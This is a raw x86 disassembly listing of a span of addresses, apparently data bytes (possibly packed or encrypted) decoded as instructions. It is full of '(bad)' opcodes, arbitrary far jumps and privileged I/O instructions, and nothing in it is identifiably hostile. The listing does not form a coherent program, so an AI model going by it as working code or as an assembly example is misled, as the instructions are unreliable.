  416999:	jp     0x416940
  41699b:	jne    0x41697a
  41699d:	jg     0x4169b4
  41699f:	mov    eax,0x7452cd8f
  4169a4:	adc    ch,ah
  4169a6:	push   es
  4169a7:	push   esp
  4169a8:	cld    
  4169a9:	xor    BYTE PTR [edi],bl
  4169ab:	xor    al,0xef
  4169ad:	(bad)  
  4169ae:	jmp    0x2264:0x2e84ef98
  4169b5:	imul   esi,DWORD PTR gs:[eax-0x7c],0x751f7e81
  4169bd:	mov    dl,BYTE PTR [esi+0x9]
  4169c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4169c1:	jo     0x416967
  4169c3:	sbb    esp,DWORD PTR [esi+0x6d516332]
  4169c9:	imul   esp,DWORD PTR [ebx],0x6faa5d10
  4169cf:	pop    ebx
  4169d0:	stos   BYTE PTR es:[edi],al
  4169d1:	sbb    dl,BYTE PTR [ecx]
  4169d3:	mov    dh,0x53
  4169d5:	daa    
  4169d6:	repz cmovge edx,DWORD PTR [esp+esi*1+0xb]
  4169dc:	mov    eax,ds:0x53f374ef
  4169e1:	cmp    BYTE PTR [ecx],0x2b
  4169e4:	push   edx
  4169e5:	mov    edx,0xef720e5a
  4169ea:	sbb    esp,esi
  4169ec:	or     bl,cl
  4169ee:	xchg   DWORD PTR [esi+0x6bc6978f],ebx
  4169f4:	cmp    bl,bl
  4169f6:	adc    DWORD PTR [edx],esi
  4169f8:	js     0x41699c
  4169fa:	jl     0x416a4f
  4169fc:	add    DWORD PTR [eax+0x1a744e61],0xffffffc3
  416a03:	sub    al,BYTE PTR [esi]
  416a05:	pop    edx
  416a06:	(bad)  
  416a07:	add    BYTE PTR [esi+0x46],0x4a
  416a0b:	aad    0xb7
  416a0d:	and    eax,0x5b86ab9d
  416a12:	mov    cl,BYTE PTR [eax+0x73]
  416a15:	out    dx,eax
  416a16:	xchg   DWORD PTR [edi],ebp
  416a18:	mov    al,ds:0x1e3808fd
  416a1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416a1e:	ret    0xd5c2
  416a21:	jmp    0x4de85362
  416a26:	mov    ebx,0x35384670
  416a2b:	cli    
  416a2c:	adc    ah,cl
  416a2e:	push   cs
  416a2f:	sub    edi,DWORD PTR [edi+0xdc5e901]
  416a35:	scas   eax,DWORD PTR es:[edi]
  416a36:	or     BYTE PTR [eax-0x66],cl
  416a39:	mov    ah,0x95
  416a3b:	mov    eax,ds:0xf2f3bb77
  416a40:	jmp    0x31d:0xa636a362
  416a47:	test   BYTE PTR [edx],bl
  416a49:	pop    edx
  416a4a:	lds    cx,DWORD PTR [edx]
  416a4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a4e:	xchg   edi,eax
  416a4f:	cmp    bl,BYTE PTR [edx+0xa]
  416a52:	inc    edx
  416a53:	jl     0x4169dc
  416a55:	(bad)  
  416a56:	lds    esp,FWORD PTR [esp+ebx*2]
  416a59:	mov    dh,BYTE PTR [eax-0x4ca31023]
  416a5f:	cmc    
  416a60:	xchg   BYTE PTR [esi],dl
  416a62:	xchg   edx,eax
  416a63:	addr16 pop eax
  416a65:	add    eax,0xf3bcb940
  416a6a:	int3   
  416a6b:	mov    eax,edi
  416a6d:	aaa    
  416a6e:	aad    0xf2
  416a70:	sbb    dh,BYTE PTR [ebp-0x4f]
  416a73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a74:	and    eax,ebp
  416a76:	sub    BYTE PTR [ecx+0x6a],0x1e
  416a7a:	dec    ebp
  416a7b:	cld    
  416a7c:	sbb    DWORD PTR [ecx-0x10d3d5ba],0xffffffa7
  416a83:	cmc    
  416a84:	ins    DWORD PTR es:[edi],dx
  416a85:	stos   DWORD PTR es:[edi],eax
  416a86:	jne    0x416ad6
  416a88:	cdq    
  416a89:	jmp    FWORD PTR [ebp+0x10102218]
  416a8f:	xchg   esp,eax
  416a90:	pop    esi
  416a91:	(bad)
  416a96:	retf   
  416a97:	jbe    0x416b0b
  416a99:	and    DWORD PTR [esi],0xffffffcf
  416a9c:	jne    0x416a9e
  416a9e:	adc    ebx,DWORD PTR [ebx+0xfd68a6e]
  416aa4:	jmp    0xbefc5a2a
  416aa9:	scas   al,BYTE PTR es:[edi]
  416aaa:	out    dx,eax
  416aab:	push   esi
  416aac:	mov    dl,0x5e
  416aae:	icebp  
  416aaf:	inc    esi
  416ab0:	neg    BYTE PTR [eax+0x11]
  416ab3:	inc    edi
  416ab4:	xor    ecx,DWORD PTR [eax+0x6b66ba46]
  416aba:	retf   
  416abb:	cli    
  416abc:	sbb    bh,0xec
  416abf:	repz lea edx,[eax-0x52d68024]
  416ac6:	pop    eax
  416ac7:	sahf   
  416ac8:	sub    BYTE PTR [ebp+0x5d],cl
  416acb:	or     eax,0x8a05bf0
  416ad0:	inc    ebp
  416ad1:	mov    WORD PTR [edi],ds
  416ad3:	neg    BYTE PTR [esp+ebx*2-0x2e]
  416ad7:	adc    eax,0x51f96e07
  416adc:	pop    ss
  416add:	mov    cl,0x96
  416adf:	lea    ebp,[edi]
  416ae1:	fadd   QWORD PTR [ecx+0x7ae0647d]
  416ae7:	xchg   ecx,eax
  416ae8:	out    dx,al
  416ae9:	rol    DWORD PTR [esi-0x6eab83ad],1
  416aef:	jl     0x416a95
  416af1:	fistp  WORD PTR [eax-0x4c047718]
  416af7:	fcom   QWORD PTR [ecx-0x78]
  416afa:	sub    bl,BYTE PTR [esi+0x18]
  416afd:	and    DWORD PTR [esi-0x4b],esp
  416b00:	prefetch (bad)
  416b01:	or     eax,0x839da8f3
  416b06:	xlat   BYTE PTR ds:[ebx]
  416b07:	jbe    0x416a9d
  416b09:	ret    0x418e
  416b0c:	(bad)  
  416b10:	adc    ch,BYTE PTR [edi]
  416b12:	stc    
  416b13:	add    edx,DWORD PTR [edi]
  416b15:	mov    ah,BYTE PTR [esi]
  416b17:	fcomp  QWORD PTR [ebx+ebp*4-0x6f]
  416b1b:	sbb    eax,0x6b012856
  416b20:	jmp    0x46c2886d
  416b25:	retf   
  416b26:	jo     0x416b37
  416b28:	mov    ebp,0xb6369d6
  416b2d:	call   FWORD PTR [edi]
  416b2f:	ss and al,0xcd
  416b32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b33:	mov    al,0x91
  416b35:	(bad)  
  416b36:	test   DWORD PTR [eax+0x40],0xa04f729
  416b3d:	add    DWORD PTR [ebx+0x19a3dac4],edx
  416b43:	ins    WORD PTR es:[edi],dx
  416b45:	scas   eax,DWORD PTR es:[edi]
  416b46:	mov    bl,0xa
  416b48:	cmc    
  416b49:	push   edi
  416b4a:	leave  
  416b4b:	repnz xchg ecx,eax
  416b4d:	inc    ebx
  416b4e:	adc    ch,BYTE PTR [ebp-0x91db751]
  416b54:	inc    eax
  416b55:	mov    ds:0x9bef914b,al
  416b5a:	sahf   
  416b5b:	aaa    
  416b5c:	mov    WORD PTR [esi+0x6d07e4f7],cs
  416b62:	int    0x7a
  416b64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b65:	cmc    
  416b66:	(bad)
  416b69:	mov    esp,ss
  416b6b:	pushf  
  416b6c:	idiv   DWORD PTR [eax-0x2e]
  416b6f:	ins    DWORD PTR es:[edi],dx
  416b70:	lock xchg ecx,eax
  416b72:	addr16 mov ds:0x3ff1,al
  416b76:	pusha  
  416b77:	outs   dx,DWORD PTR ds:[esi]
  416b78:	mov    ebp,0x780786d6
  416b7d:	push   0x266e909f
  416b82:	test   esi,esi
  416b84:	add    ebp,eax
  416b86:	les    ebp,FWORD PTR [ebx+0x2e]
  416b89:	aad    0xc4
  416b8b:	mov    ds:0x2814a31d,eax
  416b90:	lods   eax,DWORD PTR ds:[esi]
  416b91:	cmp    ebp,ebx
  416b93:	and    ch,BYTE PTR [ecx]
  416b95:	adc    BYTE PTR [ecx-0x2902709a],dl
  416b9b:	pop    ss
  416b9c:	test   edx,ebx
  416b9e:	add    al,0x98
  416ba0:	das    
  416ba1:	pop    ds
  416ba2:	aas    
  416ba3:	xchg   edi,eax
  416ba4:	dec    BYTE PTR [edi+0x7d6ae0a4]
  416baa:	cmp    eax,DWORD PTR [eax+0xd7bc4ae]
  416bb0:	outs   dx,DWORD PTR ds:[esi]
  416bb1:	addr16 dec bp
  416bb4:	or     ebx,DWORD PTR [edi+0x5e]
  416bb7:	and    dl,BYTE PTR [ebp-0x602daf48]
  416bbd:	fisttp WORD PTR [ebp+ebp*4+0x277b84b6]
  416bc4:	dec    edx
  416bc5:	fcomp  QWORD PTR [ebx+0x3214d083]
  416bcb:	mov    edx,DWORD PTR [eax+eax*2]
  416bce:	mov    cl,BYTE PTR [eax-0x12]
  416bd1:	das    
  416bd2:	(bad)
  416bd5:	jbe    0x416be6
  416bd7:	imul   esi,DWORD PTR [esp-0x29e69755],0xffffffb5
  416bdf:	data16 (bad) 
  416be1:	adc    bh,BYTE PTR [edi+0x7c]
  416be4:	hlt    
  416be5:	(bad)  [ebp+0x2d03e78f]
  416beb:	jle    0x416c29
  416bed:	jl     0x416b7f
  416bef:	call   DWORD PTR [eax]
  416bf1:	enter  0xd533,0xe8
  416bf5:	jg     0x416bff
  416bf7:	cmp    al,0x8c
  416bf9:	pop    ecx
  416bfa:	outs   dx,BYTE PTR ds:[esi]
  416bfb:	bound  edx,QWORD PTR [ecx-0x58]
  416bfe:	adc    ecx,DWORD PTR [ebx]
  416c00:	in     al,0x9b
  416c02:	aam    0xde
  416c04:	jbe    0x416c37
  416c06:	jnp    0x416c04
  416c08:	rcl    DWORD PTR [ecx],0x3d
  416c0b:	sahf   
  416c0c:	js     0x416b95
  416c0e:	out    0x6c,eax
  416c10:	sub    DWORD PTR [edx+0x5acd3237],0x3f
  416c17:	sahf   
  416c18:	pushf  
  416c19:	(bad)  
  416c1a:	scas   eax,DWORD PTR es:[edi]
  416c1b:	jecxz  0x416c57
  416c1d:	mov    cl,0x66
  416c1f:	pop    ds
  416c20:	adc    ebp,0x7b43288a
  416c26:	ret    0xb87d
  416c29:	mov    WORD PTR [ebx+ecx*8+0x1d9ea9b0],?
  416c30:	sar    DWORD PTR [eax+0x7df1355],0x9a
  416c37:	adc    eax,0xba636942
  416c3c:	mov    ebp,0x69477a51
  416c41:	(bad)  
  416c43:	and    DWORD PTR [edi],0xf35a1323
  416c49:	cwde   
  416c4a:	rol    DWORD PTR [ecx+0x70],cl
  416c4d:	jmp    0xbc29:0xfcf269a9
  416c54:	dec    ecx
  416c55:	mov    ah,0x80
  416c57:	mov    bh,0xb7
  416c59:	cwde   
  416c5a:	ds (bad) 
  416c5c:	retf   0x12c9
  416c5f:	pop    esp
  416c60:	cld    
  416c61:	fimul  WORD PTR [edi+ebp*4+0x36]
  416c65:	into   
  416c66:	imul   eax,DWORD PTR [edx+0x20],0xffffff9d
  416c6a:	mov    bl,0x26
  416c6c:	stos   BYTE PTR es:[edi],al
  416c6d:	cmp    esp,DWORD PTR [ecx+0x52]
  416c70:	popf   
  416c71:	cdq    
  416c72:	outs   dx,BYTE PTR ds:[esi]
  416c73:	push   esp
  416c74:	neg    BYTE PTR [edx-0x73fc0063]
  416c7a:	ror    BYTE PTR [ecx-0x2a1771d2],0x4a
  416c81:	or     al,ch
  416c83:	mov    eax,ds:0xa9bf4d5d
  416c88:	mov    esp,0xf81920d5
  416c8d:	adc    ecx,esi
  416c8f:	loop   0x416cd0
  416c91:	jno    0x416ca3
  416c93:	repz mov ebp,0xe1f9066d
  416c99:	and    bh,al
  416c9b:	mov    bh,0x4f
  416c9d:	mov    dh,ch
  416c9f:	push   ebp
  416ca0:	xchg   esp,eax
  416ca1:	push   ss
  416ca2:	jb     0x416c31
  416ca4:	sub    DWORD PTR [edi],ebp
  416ca6:	add    bh,cl
  416ca8:	les    ecx,FWORD PTR [ebx+edx*1+0x1343176b]
  416caf:	or     eax,0x2056b86a
  416cb4:	xchg   DWORD PTR [ebp+0x67f0ec2c],ebp
  416cba:	inc    edx
  416cbb:	das    
  416cbc:	aaa    
  416cbd:	sbb    cl,bh
  416cbf:	sub    eax,0xc8b0cf9
  416cc4:	int3   
  416cc5:	push   ss
  416cc6:	cwde   
  416cc7:	add    al,0xe9
  416cc9:	arpl   bp,ax
  416ccb:	lods   eax,DWORD PTR ds:[esi]
  416ccc:	mov    ds,WORD PTR [ecx-0x46b5d15f]
  416cd2:	mov    ch,0xb8
  416cd4:	cmp    al,dh
  416cd6:	mov    esi,0x1cb21cf3
  416cdb:	fld    TBYTE PTR [ebx-0x7a]
  416cde:	not    BYTE PTR [edi+0x35]
  416ce1:	push   ecx
  416ce2:	test   eax,0x89cbc9e1
  416ce7:	dec    esi
  416ce8:	mov    dl,0x84
  416cea:	xor    ebx,DWORD PTR [esi-0x80]
  416ced:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416cee:	leave  
  416cef:	pop    ecx
  416cf0:	loop   0x416c80
  416cf2:	push   ecx
  416cf3:	dec    esp
  416cf4:	add    BYTE PTR [edi+0xd077e76],0x4
  416cfb:	das    
  416cfc:	cmp    cl,BYTE PTR [eax-0x68670c09]
  416d02:	push   eax
  416d03:	inc    edi
  416d04:	and    BYTE PTR [esi+0x6a54d486],dh
  416d0a:	in     eax,dx
  416d0b:	and    eax,0x9803d83
  416d10:	or     eax,DWORD PTR [esi+0x330d2b2]
  416d16:	push   0x710b751
  416d1b:	out    0xce,al
  416d1d:	xor    eax,0x9bd1d2cf
  416d22:	mov    ecx,0x529898bf
  416d27:	in     eax,dx
  416d28:	iret   
  416d29:	(bad)  
  416d2a:	mov    ch,0xf0
  416d2c:	xchg   ebx,eax
  416d2d:	in     eax,dx
  416d2e:	icebp  
  416d2f:	adc    BYTE PTR [ebp+eax*4-0x24563239],bl
  416d36:	xor    al,0xe7
  416d38:	rcl    BYTE PTR [ebx-0x7b054a11],cl
  416d3e:	fidivr DWORD PTR [eax]
  416d40:	xor    esi,ebx
  416d42:	repnz and al,0x28
  416d45:	xchg   edi,eax
  416d46:	add    eax,0xe8bf0c6f
  416d4b:	popf   
  416d4c:	jecxz  0x416d4f
  416d4e:	or     eax,DWORD PTR [ecx+0x76eaf967]
  416d54:	xchg   esp,eax
  416d55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416d56:	test   BYTE PTR [eax+eax*1-0x57],dh
  416d5a:	mov    fs,WORD PTR [edi+0x16]
  416d5d:	int3   
  416d5e:	ds and al,0xe2
  416d61:	adc    bh,cl
  416d63:	sahf   
  416d64:	aam    0x86
  416d66:	inc    esi
  416d67:	ficomp WORD PTR [ebx]
  416d69:	je     0x416d17
  416d6b:	sar    DWORD PTR [ecx-0x23],1
  416d6e:	push   ebx
  416d6f:	mov    edx,0x514fdb89
  416d74:	mov    BYTE PTR [esi-0x3c5f205f],ah
  416d7a:	adc    BYTE PTR [edi+0xa9064a9],cl
  416d80:	mov    ebx,0x72fc6180
  416d85:	pop    ss
  416d86:	repnz cmc 
  416d88:	fild   DWORD PTR [edx-0x4f]
  416d8b:	arpl   WORD PTR [ebp-0x7d],bp
  416d8e:	dec    ecx
  416d8f:	push   ss
  416d90:	setns  dl
  416d93:	pop    edi
  416d94:	push   0x4473cfc1
  416d99:	or     dh,BYTE PTR ds:0x59cb9c0a
  416d9f:	daa    
  416da0:	dec    esi
  416da1:	mov    dh,0xc2
  416da3:	dec    ebx
  416da4:	and    eax,0x70abaa26
  416da9:	in     al,dx
  416daa:	(bad)  
  416dac:	add    BYTE PTR [ebp-0x351dcfb],dh
  416db2:	(bad)  
  416db3:	dec    edx
  416db4:	inc    esi
  416db5:	ins    DWORD PTR es:[edi],dx
  416db6:	push   ebp
  416db7:	ins    DWORD PTR es:[edi],dx
  416db8:	imul   edx,DWORD PTR [edi],0x6f9d6d5
  416dbe:	jge    0x416ddd
  416dc0:	or     eax,0x55a5ee9f
  416dc5:	sti    
  416dc6:	ins    BYTE PTR es:[edi],dx
  416dc7:	lock sbb cl,ah
  416dca:	sti    
  416dcb:	xchg   esp,eax
  416dcc:	mov    al,ds:0xfad687f7
  416dd1:	mov    es,WORD PTR [ebx+0x4d7e66e2]
  416dd7:	fadd   st(3),st
  416dd9:	mov    DWORD PTR [edx],edi
  416ddb:	loop   0x416e22
  416ddd:	mov    al,ah
  416ddf:	or     eax,esp
  416de1:	jl     0x416e07
  416de3:	hlt    
  416de4:	push   es
  416de5:	inc    edx
  416de6:	push   ecx
  416de7:	mov    ds:0x626a9918,eax
  416dec:	mov    dh,0x2
  416dee:	and    DWORD PTR [edi+0x3b],edi
  416df1:	rcl    BYTE PTR [ebp-0x10588dcc],cl
  416df7:	xchg   edi,eax
  416df8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416df9:	mov    bh,0xd9
  416dfb:	adc    al,0x48
  416dfd:	push   cs
  416dfe:	ins    BYTE PTR es:[edi],dx
  416dff:	(bad)  
  416e01:	mul    BYTE PTR [edx+eax*1-0x5953dc27]
  416e08:	ds nop
  416e0a:	xor    eax,0xf8d581bb
  416e0f:	(bad)  
  416e10:	outs   dx,DWORD PTR ds:[esi]
  416e11:	xor    eax,0xdeb70e4c
  416e16:	int3   
  416e17:	lahf   
  416e18:	lahf   
  416e19:	mov    al,0xca
  416e1b:	mov    eax,ds:0x3c9deee7
  416e20:	stc    
  416e21:	aaa    
  416e22:	and    edi,DWORD PTR [edx]
  416e24:	jl     0x416e9a
  416e26:	pop    edi
  416e27:	sahf   
  416e28:	mov    ds:0x9b780d1d,al
  416e2d:	cwde   
  416e2e:	call   0x22be:0xc5043bdd
  416e35:	xchg   esp,eax
  416e36:	xor    dl,BYTE PTR [edi]
  416e38:	dec    ebx
  416e39:	shl    DWORD PTR [edx],cl
  416e3b:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  416e3d:	dec    ebx
  416e3e:	jle    0x416e4b
  416e40:	addr16 dec ecx
  416e42:	imul   edx,eax,0x5bbfdea4
  416e48:	xor    ch,ch
  416e4a:	pop    edi
  416e4b:	inc    edx
  416e4c:	sti    
  416e4d:	inc    edi
  416e4e:	loop   0x416e4b
  416e50:	mov    DWORD PTR [esi+0x5],ebx
  416e53:	int3   
  416e54:	(bad)  
  416e55:	(bad)  
  416e56:	pusha  
  416e57:	fcmove st,st(0)
  416e59:	test   al,0x17
  416e5b:	in     eax,dx
  416e5c:	mov    DWORD PTR [edx+edi*8],eax
  416e5f:	adc    al,0xcf
  416e61:	bound  eax,QWORD PTR [esi-0x729c295c]
  416e67:	cs jmp 0x56ed700f
  416e6d:	and    BYTE PTR [ebx+0x7642a86c],ch
  416e73:	xchg   edi,eax
  416e74:	and    DWORD PTR ds:0x1580390d,ebx
  416e7a:	xor    dl,BYTE PTR [esi]
  416e7c:	test   eax,0xbd5b1d70
  416e81:	loop   0x416ec9
  416e83:	xchg   edi,eax
  416e84:	pop    ecx
  416e85:	jecxz  0x416eb5
  416e87:	inc    eax
  416e88:	mov    eax,ds:0x3d3ce086
  416e8d:	aad    0x87
  416e8f:	loopne 0x416e2f
  416e91:	mov    BYTE PTR [edx-0x7e],bh
  416e94:	loopne 0x416e79
  416e96:	sbb    eax,0x1995b987
  416e9b:	gs xchg esp,eax
  416e9d:	loope  0x416e73
  416e9f:	pop    ebp
  416ea0:	cli    
  416ea1:	mul    DWORD PTR [ebx+0x1e]
  416ea4:	mov    ebx,0x57c94f57
  416ea9:	fbld   TBYTE PTR [edx]
  416eab:	jl     0x416e48
  416ead:	outs   dx,BYTE PTR ds:[esi]
  416eae:	adc    esi,eax
  416eb0:	ret    0x4f7c
  416eb3:	fs sub eax,0x39bb85e3
  416eb9:	enter  0xb81,0x6a
  416ebd:	ins    DWORD PTR es:[edi],dx
  416ebe:	xor    ebx,eax
  416ec0:	sar    ch,cl
  416ec2:	sbb    eax,0xc593f1d9
  416ec7:	outs   dx,BYTE PTR ds:[esi]
  416ec8:	dec    edx
  416ec9:	int    0xa6
  416ecb:	loopne 0x416f36
  416ecd:	div    cl
  416ecf:	mov    al,0x74
  416ed1:	push   ebx
  416ed2:	cmp    ebx,DWORD PTR [ebx+ebp*4-0x14a368d0]
  416ed9:	mov    dh,0xa4
  416edb:	in     al,dx
  416edc:	repz or DWORD PTR gs:[edi],0x691b75ad
  416ee4:	imul   edx
  416ee6:	(bad)  
  416ee7:	retf   
  416ee8:	push   edi
  416ee9:	cld    
  416eea:	div    WORD PTR [esi-0x3b]
  416eee:	js     0x416f0b
  416ef0:	sar    DWORD PTR [esi-0x75],1
  416ef3:	test   DWORD PTR [ecx+ebp*1-0x678c227d],esp
  416efa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416efb:	bound  edx,QWORD PTR [ecx+0x1370e026]
  416f01:	dec    ebx
  416f02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f03:	fcmove st,st(3)
  416f05:	adc    ch,BYTE PTR [ecx]
  416f07:	cmp    al,0x11
  416f09:	imul   esp,DWORD PTR [edx+0x34c1ac27],0xffffffd3
  416f10:	push   0xffffff85
  416f12:	pushf  
  416f13:	dec    esp
  416f14:	lds    edx,FWORD PTR [eax+esi*1-0x1dc30736]
  416f1b:	xlat   BYTE PTR ds:[ebx]
  416f1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f1d:	(bad)  
  416f1e:	data16 out dx,al
  416f20:	sbb    esp,esp
  416f22:	shl    BYTE PTR [ecx],0xde
  416f25:	lea    ebp,[edi]
  416f27:	dec    esp
  416f28:	cmp    DWORD PTR ds:0xb743c9f,edi
  416f2e:	add    esp,DWORD PTR ds:0x14e1c1db
  416f34:	in     al,dx
  416f35:	stos   DWORD PTR es:[edi],eax
  416f36:	fild   WORD PTR [ecx-0x599aa134]
  416f3c:	ja     0x416f6d
  416f3e:	out    0x45,al
  416f40:	pop    eax
  416f41:	lods   eax,DWORD PTR ds:[esi]
  416f42:	cmp    al,0x72
  416f44:	lahf   
  416f45:	in     eax,dx
  416f46:	xor    edx,DWORD PTR [ebp+edx*2+0x25]
  416f4a:	cmp    dl,BYTE PTR [ebx+0x191ad524]
  416f50:	or     ch,BYTE PTR [edx+0x77]
  416f53:	bound  ecx,QWORD PTR [ebx]
  416f55:	xchg   DWORD PTR [ebx+0x7c],edx
  416f58:	fmul   DWORD PTR [ebx]
  416f5a:	jp     0x416ee7
  416f5c:	fistp  QWORD PTR [edi-0x1e5ff92d]
  416f62:	into   
  416f63:	or     BYTE PTR [edx-0x64],al
  416f66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f67:	adc    eax,0x8423c873
  416f6c:	mov    eax,ds:0x8bf7dcad
  416f71:	fcomp  DWORD PTR [eax+0x3f618adc]
  416f77:	inc    esi
  416f78:	mov    DWORD PTR [edx+0x57],edi
  416f7b:	nop
  416f7c:	jg     0x416f5b
  416f7e:	pop    edx
  416f7f:	test   eax,0xcff83aac
  416f84:	adc    ah,al
  416f86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f87:	mov    cl,0x6e
  416f89:	popf   
  416f8a:	pop    es
  416f8b:	fld    QWORD PTR [ecx+0xc]
  416f8e:	in     al,0x86
  416f90:	gs jmp 0x2fe5:0xaf6b3998
  416f98:	adc    DWORD PTR [edx-0x2533451f],edi
  416f9e:	lahf   
  416f9f:	daa    
  416fa0:	out    0xec,eax
  416fa2:	int    0x74
  416fa4:	or     eax,0x50ac69eb
  416fa9:	adc    esp,DWORD PTR [edi-0x6a]
  416fac:	xor    al,0xb0
  416fae:	cs pop es
  416fb0:	popa   
  416fb1:	jle    0x416fba
  416fb3:	imul   esp,DWORD PTR [ecx+eiz*8],0x36
  416fb7:	inc    ebp
  416fb8:	pushf  
  416fb9:	sbb    DWORD PTR [edx-0xe],edx
  416fbc:	ins    BYTE PTR es:[edi],dx
  416fbd:	push   edi
  416fbe:	js     0x417000
  416fc0:	dec    esi
  416fc1:	(bad)  
  416fc4:	mul    DWORD PTR [edx+edx*4]
  416fc7:	in     eax,dx
  416fc8:	retf   0x8d99
  416fcb:	jne    0x416f6f
  416fcd:	dec    esi
  416fce:	ins    DWORD PTR es:[edi],dx
  416fcf:	ficomp DWORD PTR [ecx+0x5ab6cb55]
  416fd5:	or     ebx,DWORD PTR [ebp+esi*1+0x5861d3d4]
  416fdc:	les    edi,FWORD PTR [esp+esi*8]
  416fdf:	(bad)  
  416fe0:	cs call 0x40895fed
  416fe6:	pop    esi
  416fe7:	sub    ah,dh
  416fe9:	stc    
  416fea:	xchg   DWORD PTR ds:0xa0626dd2,ebx
  416ff0:	push   esp
  416ff1:	xor    DWORD PTR [ebx+0xa],eax
  416ff4:	std    
  416ff5:	cmp    DWORD PTR [eax+0x21],eax
  416ff8:	xchg   DWORD PTR ds:0xeb584f40,ebp
  416ffe:	pusha  
  416fff:	pushf  
  417000:	pop    ss
  417001:	add    esi,DWORD PTR [esi]
  417003:	inc    ecx
  417004:	inc    ebx
  417005:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417006:	enter  0xda60,0xfe
  41700a:	mov    al,0xd8
  41700c:	mov    esi,0xc2d51dd9
  417011:	push   ecx
  417012:	pop    ecx
  417013:	sub    dl,bh
  417015:	cmp    eax,0xa87bab19
  41701a:	jl     0x41709a
  41701c:	cmp    DWORD PTR ds:0x120b5e82,edi
  417022:	rcl    dh,cl
  417024:	and    esi,DWORD PTR [edi+0x36]
  417027:	int    0x74
  417029:	sub    al,0x1a
  41702b:	scas   eax,DWORD PTR es:[edi]
  41702c:	mov    eax,ds:0x48b5fcf2
  417031:	mov    esi,0xe92d25e2
  417036:	push   0x20
  417038:	imul   ecx,DWORD PTR [ebp-0x3d],0x979110d6
  41703f:	and    eax,0x95424e68
  417044:	xchg   ebx,eax
  417045:	(bad)  
  417046:	clc    
  417047:	adc    al,0x28
  417049:	or     al,0xed
  41704b:	stos   BYTE PTR es:[edi],al
  41704c:	retf   0x2241
  41704f:	pop    ebp
  417050:	sub    esi,DWORD PTR [ebp+0x619259c0]
  417056:	inc    ecx
  417057:	mov    al,ds:0x56839421
  41705c:	(bad)  
  41705d:	xor    eax,0x2f988413
  417062:	mov    bh,0xc9
  417064:	cmp    eax,0xd83421f4
  417069:	dec    edx
  41706a:	pop    edx
  41706b:	imul   esi,DWORD PTR [ebp+0x14],0xea134fac
  417072:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417073:	mov    cl,0xde
  417075:	or     al,0xce
  417077:	dec    edi
  417078:	clc    
  417079:	fldenv [esp+ecx*4+0x6fa58595]
  417080:	sbb    eax,DWORD PTR [ebx+ebp*2-0x42bce73f]
  417087:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417088:	pop    ss
  417089:	adc    eax,0x15a43757
  41708e:	mov    ah,0x99
  417090:	inc    ebp
  417091:	jnp    0x4170e6
  417093:	mov    edi,0xbd9250eb
  417098:	mov    edx,0xc6ea3b0
  41709d:	sub    DWORD PTR [edi-0x31],esp
  4170a0:	fsubr  DWORD PTR ds:0xa3d8b464
  4170a6:	sub    BYTE PTR [edi],0xc2
  4170a9:	daa    
  4170aa:	mov    esp,ebp
  4170ac:	push   edi
  4170ad:	(bad)  
  4170ae:	jae    0x41706d
  4170b0:	pop    ebp
  4170b1:	cli    
  4170b2:	mov    dl,bh
  4170b4:	hlt    
  4170b5:	repnz lea esp,[esi-0x4dd88c13]
  4170bc:	xchg   esp,eax
  4170bd:	inc    ebx
  4170be:	jb     0x417135
  4170c0:	jo     0x417133
  4170c2:	fstp   TBYTE PTR [ecx]
  4170c4:	push   ss
  4170c5:	sbb    BYTE PTR [eax+0x2cfa9a68],bh
  4170cb:	lds    esi,FWORD PTR [edi+0x74]
  4170ce:	xchg   BYTE PTR [eax+0x7d],ah
  4170d1:	add    al,0x4f
  4170d3:	fcmove st,st(3)
  4170d5:	ins    BYTE PTR es:[edi],dx
  4170d6:	(bad)
  4170db:	fld    TBYTE PTR [ebx-0x1e]
  4170de:	outs   dx,DWORD PTR ds:[esi]
  4170df:	aam    0x36
  4170e1:	dec    ebp
  4170e2:	sub    al,0xc3
  4170e4:	iret   
  4170e5:	xchg   esp,eax
  4170e6:	add    BYTE PTR [ebp-0x5f64cde6],bh
  4170ec:	adc    eax,0x88df3b84
  4170f1:	and    BYTE PTR [ecx],0x83
  4170f4:	(bad)  
  4170f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4170f6:	add    eax,0xa5ed2c7b
  4170fb:	sbb    dl,BYTE PTR [edi-0x24217afb]
  417101:	ins    DWORD PTR es:[edi],dx
  417102:	inc    ebx
  417103:	push   edx
  417104:	bound  ecx,QWORD PTR [edi-0x78]
  417107:	pop    edi
  417108:	shr    DWORD PTR [ebx+0x43e77ff],cl
  41710e:	rcl    BYTE PTR [esi-0x59],1
  417111:	(bad)  
  417112:	jl     0x41715e
  417114:	dec    esi
  417115:	dec    ecx
  417116:	sbb    ebx,0xfc3b060d
  41711c:	pop    edi
  41711d:	aaa    
  41711e:	(bad)  
  41711f:	outs   dx,BYTE PTR ds:[esi]
  417120:	sbb    al,BYTE PTR ds:0xe48160df
  417126:	cld    
  417127:	adc    esp,DWORD PTR [esi+0x10]
  41712a:	clc    
  41712b:	fsub   st,st(1)
  41712d:	aad    0xa5
  41712f:	addr16 ds or bl,cl
  417133:	test   al,0x4f
  417135:	mov    ds:0xae9e42f,eax
  41713a:	div    BYTE PTR [edx-0x7e]
  41713d:	pop    esp
  41713e:	mov    ds:0x114321e1,eax
  417143:	pmulhuw mm2,QWORD PTR [eax+0x6a7ff879]
  41714a:	iret   
  41714b:	inc    edx
  41714c:	push   0x9e953d55
  417151:	fmulp  st(5),st
  417153:	mov    dh,0xf0
  417155:	inc    ebp
